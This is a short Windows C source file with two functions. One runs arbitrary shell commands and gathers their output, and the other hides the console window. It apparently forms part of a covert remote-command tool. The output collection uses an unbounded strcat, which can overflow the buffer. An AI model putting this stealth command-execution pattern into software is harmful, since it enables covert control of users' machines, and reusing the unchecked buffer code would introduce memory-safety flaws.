#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define BUFFER_SIZE 1024
#define RESPONSE_BUFFER_SIZE 1024 * 1024    // 1MB (Windows\System32 includes many files..)

const char *executeCommand(const char *cmd)
{
    FILE *fp;
    static char total_response[RESPONSE_BUFFER_SIZE];
    char container[BUFFER_SIZE];

    memset(total_response, 0, sizeof(total_response));
    memset(container, 0, sizeof(container));

    fp = _popen(cmd, "rt");
    
    while(fgets(container, BUFFER_SIZE, fp) != NULL) 
    {
        strcat(total_response, container);
    }

    _pclose(fp);

    return total_response;
}

void hideConsole()
{
    HWND stealth;
	
    AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);
}